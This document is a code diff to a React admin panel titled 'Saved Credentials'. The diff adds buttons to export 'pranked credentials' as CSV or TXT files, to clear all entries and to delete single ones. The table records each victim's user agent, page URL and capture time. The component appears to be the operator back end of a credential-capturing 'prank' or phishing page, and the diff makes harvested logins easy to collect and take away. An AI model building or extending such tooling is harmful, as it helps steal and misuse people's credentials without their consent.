@@ -43,6 +43,47 @@ const AdminTable = ({ onExit }) => {
     }
   };
 
+  const downloadFile = async (format) => {
+    setError('');
+    try {
+      const res = await fetch(`${backendUrl}/api/pranked-credentials/export?format=${format}`);
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      const blob = await res.blob();
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `pranked_credentials.${format}`;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      window.URL.revokeObjectURL(url);
+    } catch (e) {
+      setError(`Failed to export (${format})${e?.message ? `: ${e.message}` : ''}`);
+    }
+  };
+
+  const clearAll = async () => {
+    if (!window.confirm('Clear all entries? This cannot be undone.')) return;
+    try {
+      const res = await fetch(`${backendUrl}/api/pranked-credentials/clear`, { method: 'POST' });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      await fetchData();
+    } catch (e) {
+      setError(`Failed to clear all entries${e?.message ? `: ${e.message}` : ''}`);
+    }
+  };
+
+  const deleteOne = async (id) => {
+    if (!window.confirm('Delete this entry?')) return;
+    try {
+      const res = await fetch(`${backendUrl}/api/pranked-credentials/${id}`, { method: 'DELETE' });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      await fetchData();
+    } catch (e) {
+      setError(`Failed to delete entry${e?.message ? `: ${e.message}` : ''}`);
+    }
+  };
+
   useEffect(() => {
     fetchData();
   }, [backendUrl]);
@@ -53,7 +94,10 @@ const AdminTable = ({ onExit }) => {
         <div className="flex items-center justify-between mb-6">
           <h1 className="text-2xl font-bold">Admin • Saved Credentials</h1>
           <div className="space-x-3">
+            <button onClick={() => downloadFile('csv')} className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-600">Export CSV</button>
+            <button onClick={() => downloadFile('txt')} className="px-4 py-2 rounded-lg bg-teal-500 hover:bg-teal-600">Export TXT</button>
             <button onClick={fetchData} className="px-4 py-2 rounded-lg bg-indigo-500 hover:bg-indigo-600">Refresh</button>
+            <button onClick={clearAll} className="px-4 py-2 rounded-lg bg-red-600 hover:bg-red-700">Clear All</button>
             <button onClick={onExit} className="px-4 py-2 rounded-lg bg-gray-600 hover:bg-gray-700">Exit</button>
           </div>
         </div>
@@ -74,12 +118,13 @@ const AdminTable = ({ onExit }) => {
                   <th className="text-left px-4 py-3">User Agent</th>
                   <th className="text-left px-4 py-3">URL</th>
                   <th className="text-left px-4 py-3">Pranked At</th>
+                  <th className="text-left px-4 py-3">Actions</th>
                 </tr>
               </thead>
               <tbody>
                 {rows.length === 0 ? (
                   <tr>
-                    <td colSpan={7} className="px-4 py-6 text-center text-white/70">No entries yet</td>
+                    <td colSpan={8} className="px-4 py-6 text-center text-white/70">No entries yet</td>
                   </tr>
                 ) : (
                   rows.map((r, idx) => (
@@ -91,6 +136,9 @@ const AdminTable = ({ onExit }) => {
                       <td className="px-4 py-3 max-w-[320px] truncate" title={r.userAgent}>{r.userAgent}</td>
                       <td className="px-4 py-3 max-w-[360px] truncate" title={r.url}>{r.url}</td>
                       <td className="px-4 py-3">{r.prankedAt}</td>
+                      <td className="px-4 py-3">
+                        <button onClick={() => deleteOne(r.id)} className="px-3 py-1 rounded-md bg-red-500 hover:bg-red-600">Delete</button>
+                      </td>
                     </tr>
                   ))
                 )}
